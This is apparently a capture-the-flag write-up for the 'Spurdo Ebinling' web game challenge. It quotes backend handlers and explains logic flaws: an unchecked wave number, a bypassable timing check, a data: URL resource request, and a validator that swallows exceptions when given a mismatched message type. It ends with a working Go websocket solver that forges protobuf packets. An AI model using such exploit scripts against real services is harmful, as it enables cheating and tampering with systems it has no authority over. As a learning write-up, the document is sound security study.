---
id: bce84ff4-c54a-41ed-a732-b5a1db888a6b
title: Spurdo Enbinling
created_time: 2024-04-30T11:47:00.000Z
last_edited_time: 2024-04-30T23:26:00.000Z
cover_image: ./imgs/Screenshot_2024-04-30_195201_yPPLW612.png
icon_emoji: 🕸️
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Spurdo Enbinling
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/Screenshot_2024-04-30_195201_yPPLW612.png

---

# Description

Spurdo decided to develop a web game while he was solo leveling. But due to lack of skill, spurdo developed a game that cannot be completed by anyone sane enough. And because of that he decided to invite some beta players(you) for his game.

Good luck.

[https://spurdo-ebinling.1337.sb](https://spurdo-ebinling.1337.sb/)

**author**: es3n1n, cpp.dog

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/54157cdd-98b3-4455-a607-88cab6194672/web_spurdo-leveling.7z?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466SVL7MWU5%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T073424Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQDsTdqZ%2BhSCRyIhs99nbpNkCUKuV4z4K9Hk6QbXSwLUaAIhAPk9JvOhZQ82SCtR%2BOy06M6Jco50KEPa5%2FJ9WaoKUAjhKogECOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igxug3U%2BikRFZ4f7WH4q3AOTf4vem1k3K24SjuP%2FQ2z2yWiYSqgmrC6k7yRXLcMZ%2FBqHs5h3agMgmvmp5ZrAU1DKg7zyurMvu95TGHqwMsBiTVcI7YKefN1jzPufJlXBZ%2FllpLJlsEA0dovmqq661zCDQz%2FC%2FD%2BZujGgoluNUcwdBJ8C1tm0iYUxj9BM4OaoI%2FZrZU1bKS1vmBto6LVGoJOKjHsO9saXjvaUD5GC0CdbznQTnhIxJ5wOjpHys0nlbHwuhHrVfOkyfC2KwF67TTXWSI5L%2B6XYHQYoEKNBoo6o4ayXhjYQ%2FPTdNqfkupUvtFMbJPSARKvQQaR3CrvEw%2Bps7T5KOICHakn1c0LKZonxDT60IOzPnSAshBjajsXIMRR0tybgTerBIuOY4XIpiGdWBPjEZW6MUTc2PguJEmeO9u%2B6zTcmNXihf1TJvuAco0i9D8j5A2qKE96dR6GWD7bfxT%2Fbi1XVQjXMiWQNPJHJbfGY5LI8W3QmHR80MQMDHp4X9pNPODTMx0bA%2BYoq%2B5sJUHuw4znFmsbUrB%2FQnLTv1u2VFVPnqMU5MQp8%2Fvjo9P8Jnc%2FdzGN8iySSuAXYakQgQPDgZHs1huQYhBiD5N2IGP24Nvrtn8kSi%2FB9cUrTdnCnC%2FddyfwwCkdQjDCvs8DBBjqkATzXlKF46p%2ByXmjYnuy%2BeAz5knQT2j7F%2FQ34WQRkbHOlt75zH7TuEowLKw1vyq08mGj4rIUr0CclmJ3eZOQ87sJF9Qg5wtUdqgGepq7rxlCaCbd%2FwU1MnB3PQ0fKmGAHhu5rkuEuqxU8hDJJjU7tigQznKGMw4x4L7rx%2FN2pJcQN9t3HryNgBMG9ubQPHTdniKf5DwQ2C3UZtiHzrA4O7FdvvFWg\&X-Amz-Signature=7c1619a9ee134a35e975072e45a1869b3e6295e6f94d85814e0cfe0a89c11efb\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# Approach

## Understanding the Challenge

The challenge involves using a protocol buffer to interact with a web socket across two services: backend and frontend. The goal is to unlock all achievements. If successful, the application will automatically present the flag.

Here is the list of achievements that we need to obtain.

```python
available_achievements = [
    Achievement(name='kill 1 mob', condition=lambda x: x.total_mobs_killed >= 1),
    Achievement(name='kill 5 mobs', condition=lambda x: x.total_mobs_killed >= 5),
    Achievement(name='kill 100 mobs', condition=lambda x: x.total_mobs_killed >= 100),

    Achievement(name='unlock level 2', condition=lambda x: x.level >= 2),
    Achievement(name='unlock level 5', condition=lambda x: x.level >= 5),
    Achievement(name='unlock level 75', condition=lambda x: x.level >= 75),

    Achievement(name='survive 5 waves', condition=lambda x: x.wave_number >= 5),
    Achievement(name='survive 50 waves', condition=lambda x: x.wave_number >= 50),
    Achievement(name='survive 150 waves', condition=lambda x: x.wave_number >= 150),

    Achievement(name='unlock all items', condition=lambda x: len(x.inventory) >= ITEMS_COUNT),

    Achievement(name='cheater!', condition=lambda x: x.is_cheater),

    # is this enough? if not, please let me know, and we'll make a pt.2 of this challenge :^)
]
```

Here is the trigger condition.

```python
    if len(session.game.unlocked_achievements) == len(available_achievements):
        session.inject_packet(SAchievementUnlocked(
            name=config.FLAG
        ))

```

## How to Obtain All Achievements

### Survive Waves & Kill Mobs

To achieve these two goals, we need to bypass these 2 restrictions.

```python
@handler.dispatcher()
async def on_wave(session: Session, message: Wave) -> Wave:
    cleared_in: float = .0
    min_clearance_time: float = .0

    if session.game.wave_number > 0:
        if message.number > len(session.game.waves):
            return message

        wave_info = session.game.waves[message.number - 1]

        if len(wave_info.mobs.enemies) != len(message.mobs):
            session.log_critical('Attempted to send invalid wave end message. len(enemies) != mobs_killed')

        if wave_info.mobs.contains_invincible_enemies:
            session.log_critical('Attempted to clear wave with an invincible mob!')

        cleared_in = message.current_time - wave_info.started_at_user_time
        min_clearance_time = (min_wave_clearance_time(
            sum([x.health for x in wave_info.mobs.enemies]), session.game.level
        ) * 1e3)
        min_clearance_time -= WAVE_REMOTE_CLEARANCE_WINDOW

        if cleared_in < min_clearance_time:
            session.log_critical(f'Cleared wave too quickly ({cleared_in} vs {min_clearance_time} diff '
                                 f'{min_clearance_time - cleared_in})')

        cleared_in_local: float = time() - wave_info.started_at_local_time
        cleared_in_local -= WAVE_CLEARANCE_WINDOW
        cleared_in_local *= 1e3
        if cleared_in_local > cleared_in:
            session.log_critical(f'Cleared wave too quickly #2 ({cleared_in_local} vs {cleared_in})')

        session.game.total_mobs_killed += len(wave_info.mobs.enemies)

    if session.game.wave_number > 0:
        session.log_info(f'Cleared wave in {cleared_in:.0f} (best {min_clearance_time:.0f} diff '
                         f'{(cleared_in - min_clearance_time):.0f}). Starting a new one.')

    for i, achievement in enumerate(available_achievements):
        if i in session.game.unlocked_achievements:
            continue

        if achievement.condition(session.game) is False:
            continue

        session.game.unlock_achievement(session, i, achievement.name)

    if len(session.game.unlocked_achievements) == len(available_achievements):
        session.inject_packet(SAchievementUnlocked(
            name=config.FLAG
        ))

    session.game.wave_number += 1
    new_wave = LocalWave.new(message.current_time, session.game.wave_number)
    session.game.waves.append(new_wave)

    session.game.xp_count += new_wave.mobs.total_xp

    return Wave(
        number=session.game.wave_number,
        mobs=[
            Wave.Mob(
                health=mob.health,
                damage=mob.damage,
                invincible=mob.invincible,
                xp=mob.xp,
                drop=ItemDetail(
                    name=mob.dropped_item.name,
                    damage=mob.dropped_item.damage,
                    icon=mob.dropped_item.icon,
                ) if mob.dropped_item is not None else None
            )
            for mob in new_wave.mobs.enemies
        ],
        current_time=message.current_time,
    )
```

Here are the 2 restrictions:

*   `if wave_info.mobs.contains_invincible_enemies:` We can bypass this by exploiting the fact that the application doesn't check the current wave. Thus, we can send the results from the first wave to advance to the next wave.

*   If the conditions `if cleared_in < min_clearance_time:` and `if cleared_in_local > cleared_in:` are only checking if `cleared_in` is less than `min_clearance_time` and `cleared_in_local`, we can bypass these checks by making `cleared_in` greater than these two variables.

### Unlock Level

As the only restriction requires us to obtain all the experience points from killing mobs, we need to level up only after clearing several waves. This approach allows us to gather all the necessary experience points to advance to higher levels. Below is the related level-up code:

```python
@handler.validator()
async def on_level_up_validation(session: Session, message: CLevelUp) -> bool:
    if message.item <= session.game.level:
        return False
    session.log_info(message)
    return True


@handler.dispatcher()
async def on_level_up(session: Session, message: CLevelUp) -> SLevelUp:
    while message.item > session.game.level:
        required = xp_required_to_level_up(session.game.level)

        if session.game.xp_count < required:
            break

        session.game.xp_count -= required
        session.game.level += 1

    session.log_info(f'Level upped to {session.game.level}')
    return SLevelUp()
```

### Cheater!

To achieve this, you need to trigger the ResourceRequest. You can generate a programming interface from the file `spurdo-ebinling/attachment/backend/messages/protocol.proto` in your preferred programming language. This makes encoding our payload to a protocol buffer straightforward. I used [Release Protocol Buffers v26.1 · protocolbuffers/protobuf (github.com)](https://github.com/protocolbuffers/protobuf/releases/tag/v26.1) for compilation.

```python
@handler.dispatcher()
async def on_resource_request(session: Session, msg: CRequestResource) -> SRequestResource:
    result = SRequestResource(item=DEFAULT, success=False)

    try:
        msg_item = msg.item.split('?')[0]
        info = urlparse(msg_item)
    except Exception as e:  # noqa
        return result
    session.log_info(info)
    if info.scheme in ['file']:
        return result

    try:
        data = request_url(msg_item)
        if b'cr3{' in data:
            session.game.is_cheater = True
            session.log_warn('Cheater!')
        result.success = True
    except Exception as e:  # noqa
        session.log_info(e)
        pass

    return result

```

After doing that, you can add `data:,cr3{` as a value for `msg.item`, which will trigger the cheater achievement.

### Unlock All Items

To achieve this, we need to examine the structure of the protocol we use to send the protocol buffer payload. The goal is to bypass the validator of the `on_inventory_equip` function, allowing us to add many items and obtain the achievement.

```python
@handler.validator()
async def on_inventory_equip_validator(session: Session, message: CInventoryEquip) -> bool:
    if message.item.name in [x.name for x in session.game.inventory]:
        return False
    session.log_info(message)
    return True


@handler.dispatcher()
async def on_inventory_equip(session: Session, message: CInventoryEquip) -> SInventoryEquip:
    item_info = ensure_item(message.item)
    if item_info is None:
        session.log_warn(f'Attempted to equip an unknown item {message.item.name}')
        return handler.reject_value  # type: ignore

    session.game.inventory.append(ItemInfo(
        name=item_info.name,
        damage=item_info.damage,
        icon=item_info.icon,
        chance=100
    ))
    session.log_info(f'Equipped {item_info.name}')

    return SInventoryEquip(success=True)

```

So, how are we going to bypass this validator? The validator uses the logger.catch function as a decorator that catches all errors. Therefore, if there's an error, logger.catch will return None.

```python
@logger.catch
async def _call_validator(handler: MessageHandler, session: Session, data: TMessageProto) -> bool:
    if handler.validator_callback is None:
        return True
    return await handler.validator_callback(session, data)
```

The check below assesses if `_call_validator` returns False. Therefore, if it returns None, the condition will not be satisfied. This behavior allows us to bypass the validator by causing an error.

```python
async def call_message_handlers(session: Session, message: Message, data: TMessageProto) -> TMessageProto:
    result: TMessageProto = SPing()  # type: ignore

    for handler in registered_handlers[message.packet_type]:
        if await _call_validator(handler, session, data) is False:
            assert handler.reject_value is not None
            result = handler.reject_value
            continue

        result = await _call_dispatcher(handler, session, data)

    return result
```

So, how are we going to trigger the error inside the validator? We should note that there are actually two types of identifiers from the package we sent here:

```javascript
spurdoWS.sendMessage = function(type, val) {
    const msg = new protobuf.Packet();
    msg.setType(type);
    msg.setValue(val.serializeBinary());

    const messageBytes = msg.serializeBinary();
    const byteArray = Uint8Array.from([
        0x6d, 0x65, 0x6d, 0x65,
        msg.getType()/*this is actually a packet type*/ & 0xff, (msg.getType()/*and this is a message type*/ >> 8) & 0xff,
        ...messageBytes
    ]);

    this.send(byteArray);
}
```

There are two controllers: one for the handler and one for the message type. We have the option to change the message type. For example, if we send a message of type `RequestResource` instead of the correct type `InventoryEquip`, an error will occur in the loop `if message.item.name in [x.name for x in session.game.inventory]:` because `message.item.name` is undefined. This enables us to bypass the validator function.

## Solution

Here's the solver I wrote in Golang to tackle this challenge. You can generate the protocol buffer interface using a command like `protoc -I=. --go_out=spurdo_leveling/ ./spurdo_leveling/protocol.proto`. However, you'll first need to install the Golang support for protoc.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/4da95c94-18e5-4e58-9df7-04bd3a576d48/golang.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466SVL7MWU5%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T073424Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQDsTdqZ%2BhSCRyIhs99nbpNkCUKuV4z4K9Hk6QbXSwLUaAIhAPk9JvOhZQ82SCtR%2BOy06M6Jco50KEPa5%2FJ9WaoKUAjhKogECOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igxug3U%2BikRFZ4f7WH4q3AOTf4vem1k3K24SjuP%2FQ2z2yWiYSqgmrC6k7yRXLcMZ%2FBqHs5h3agMgmvmp5ZrAU1DKg7zyurMvu95TGHqwMsBiTVcI7YKefN1jzPufJlXBZ%2FllpLJlsEA0dovmqq661zCDQz%2FC%2FD%2BZujGgoluNUcwdBJ8C1tm0iYUxj9BM4OaoI%2FZrZU1bKS1vmBto6LVGoJOKjHsO9saXjvaUD5GC0CdbznQTnhIxJ5wOjpHys0nlbHwuhHrVfOkyfC2KwF67TTXWSI5L%2B6XYHQYoEKNBoo6o4ayXhjYQ%2FPTdNqfkupUvtFMbJPSARKvQQaR3CrvEw%2Bps7T5KOICHakn1c0LKZonxDT60IOzPnSAshBjajsXIMRR0tybgTerBIuOY4XIpiGdWBPjEZW6MUTc2PguJEmeO9u%2B6zTcmNXihf1TJvuAco0i9D8j5A2qKE96dR6GWD7bfxT%2Fbi1XVQjXMiWQNPJHJbfGY5LI8W3QmHR80MQMDHp4X9pNPODTMx0bA%2BYoq%2B5sJUHuw4znFmsbUrB%2FQnLTv1u2VFVPnqMU5MQp8%2Fvjo9P8Jnc%2FdzGN8iySSuAXYakQgQPDgZHs1huQYhBiD5N2IGP24Nvrtn8kSi%2FB9cUrTdnCnC%2FddyfwwCkdQjDCvs8DBBjqkATzXlKF46p%2ByXmjYnuy%2BeAz5knQT2j7F%2FQ34WQRkbHOlt75zH7TuEowLKw1vyq08mGj4rIUr0CclmJ3eZOQ87sJF9Qg5wtUdqgGepq7rxlCaCbd%2FwU1MnB3PQ0fKmGAHhu5rkuEuqxU8hDJJjU7tigQznKGMw4x4L7rx%2FN2pJcQN9t3HryNgBMG9ubQPHTdniKf5DwQ2C3UZtiHzrA4O7FdvvFWg\&X-Amz-Signature=85983e29a724ba6629c30320cb90e26e092b63996237cd59b81651328ffb0bb8\&X-Amz-SignedHeaders=host\&x-id=GetObject)

To run it, you can use the command `go run .`.

![](./imgs/Untitled_sxDTz0JK.png)

```go
package main

import (
	"fmt"
	"log"
	"net/http"

	protobuf "golang/spurdo_leveling"

	"github.com/gorilla/websocket"
	"google.golang.org/protobuf/proto"
)

func con() {
	// spurdoWS, _, err := websocket.DefaultDialer.Dial("ws://localhost:13388/ws", nil)
	spurdoWS, _, err := websocket.DefaultDialer.Dial("wss://spurdo-ebinling.1337.sb/ws", http.Header{
		"Origin": []string{"https://spurdo-ebinling.1337.sb"},
	})
	if err != nil {
		log.Fatal("Error connecting to WebSocket:", err)
	}
	defer spurdoWS.Close()

	// function to send our packet
	sendMessage := func(packetType protobuf.PacketId, messageType protobuf.PacketId, val []byte) {
		msg := &protobuf.Packet{
			Type:  messageType,
			Value: val,
		}

		packet := &protobuf.Packet{
			Type:  packetType,
			Value: val,
		}

		messageBytes, err := proto.Marshal(msg)
		if err != nil {
			log.Fatal("Error marshaling message:", err)
		}

		byteArray := append([]byte{0x6d, 0x65, 0x6d, 0x65}, byte(packet.Type&0xff), byte((msg.Type>>8)&0xff))
		byteArray = append(byteArray, messageBytes...)

		err = spurdoWS.WriteMessage(websocket.BinaryMessage, byteArray)
		if err != nil {
			log.Fatal("Error sending message:", err)
		}
	}

	waveEndMod := func(mobs []*protobuf.Wave_Mob) {
		message := &protobuf.Wave{
			Number: 1,
		}

		mobsList := []*protobuf.Wave_Mob{}
		for _, mob := range mobs {
			mob = &protobuf.Wave_Mob{
				Damage:     mob.Damage,
				Xp:         mob.Xp,
				Health:     0,
				Invincible: mob.Invincible,
			}
			mobsList = append(mobsList, mob)
		}

		message.Mobs = mobsList
		// bypass time
		message.CurrentTime = float64(1000000000000000)
		msg, err := proto.Marshal(message)
		if err != nil {
			log.Fatal(err)
		}
		sendMessage(protobuf.PacketId_PACKET_ID_WAVE, protobuf.PacketId_PACKET_ID_WAVE, msg)
	}
	go func() {
		wave, _ := proto.Marshal(&protobuf.Wave{
			Number:      0,
			Mobs:        []*protobuf.Wave_Mob{},
			CurrentTime: 0,
		})
		// start wave
		sendMessage(protobuf.PacketId_PACKET_ID_WAVE, protobuf.PacketId_PACKET_ID_WAVE, wave)
		// resource message
		requestResource, _ := proto.Marshal(&protobuf.CRequestResource{Item: "data:,cr3{"})
		for i := 0; i < 6; i++ {
			// get 6 item so we can get all item achievement
			sendMessage(protobuf.PacketId_PACKET_ID_INVENTORY_EQUIP, protobuf.PacketId_PACKET_ID_REQUEST_RESOURCE, requestResource)
		}
		// trigger cheater achievement
		sendMessage(protobuf.PacketId_PACKET_ID_REQUEST_RESOURCE, protobuf.PacketId_PACKET_ID_REQUEST_RESOURCE, requestResource)
		// it's for checking the inventory
		sendMessage(protobuf.PacketId_PACKET_ID_INVENTORY, protobuf.PacketId_PACKET_ID_INVENTORY, []byte{})
	}()

	mobs := []*protobuf.Wave_Mob{}

	for {
		_, msg, err := spurdoWS.ReadMessage()
		if err != nil {
			log.Println("Error reading message:", err)
			return
		}

		packet := &protobuf.Packet{}
		err = proto.Unmarshal(msg[6:], packet)
		if err != nil {
			log.Println("Error unmarshaling packet:", err)
			continue
		}

		switch protobuf.PacketId(packet.Type) {
		case protobuf.PacketId_PACKET_ID_WAVE:
			wave := &protobuf.Wave{}
			err = proto.Unmarshal(packet.Value, wave)
			if err != nil {
				log.Println("Error unmarshaling wave:", err)
				continue
			}
			// keep the first strage data to be reused in next stage
			if len(mobs) == 0 {
				mobs = wave.Mobs
				fmt.Println(wave)
				waveEndMod(wave.Mobs)
			} else {
				waveEndMod(mobs)
			}
		case protobuf.PacketId_PACKET_ID_INVENTORY:
			inventory := &protobuf.SInventory{}
			err = proto.Unmarshal(packet.Value, inventory)
			if err != nil {
				log.Println("Error unmarshaling inventory:", err)
				continue
			}
			log.Println("Inventory:", inventory)
		case protobuf.PacketId_PACKET_ID_INVENTORY_EQUIP:
			inventoryEquip := &protobuf.SInventoryEquip{}
			err = proto.Unmarshal(packet.Value, inventoryEquip)
			if err != nil {
				log.Println("Error unmarshaling inventory equip:", err)
				continue
			}
			log.Println("Inventory Equip:", inventoryEquip)
		case protobuf.PacketId_PACKET_ID_LEVEL_UP:
			levelUp := &protobuf.SLevelUp{}
			err = proto.Unmarshal(packet.Value, levelUp)
			if err != nil {
				log.Println("Error unmarshaling level up:", err)
				continue
			}
		case protobuf.PacketId_PACKET_ID_ACHIEVEMENT_UNLOCKED:
			achievementUnlocked := &protobuf.SAchievementUnlocked{}
			err = proto.Unmarshal(packet.Value, achievementUnlocked)
			if err != nil {
				log.Println("Error unmarshaling achievement unlocked:", err)
				continue
			}
			log.Println("Achievement unlocked:", achievementUnlocked.Name)
			// level up
			levelUp, _ := proto.Marshal(&protobuf.CLevelUp{Item: 300})
			sendMessage(protobuf.PacketId_PACKET_ID_LEVEL_UP, protobuf.PacketId_PACKET_ID_LEVEL_UP, levelUp)
		case protobuf.PacketId_PACKET_ID_REQUEST_RESOURCE:
			requestResource := &protobuf.SRequestResource{}
			err = proto.Unmarshal(packet.Value, requestResource)
			if err != nil {
				log.Println(err)
			}
			log.Println(requestResource)
		}
	}
}

func main() {
	go con()
	select {}
}
```
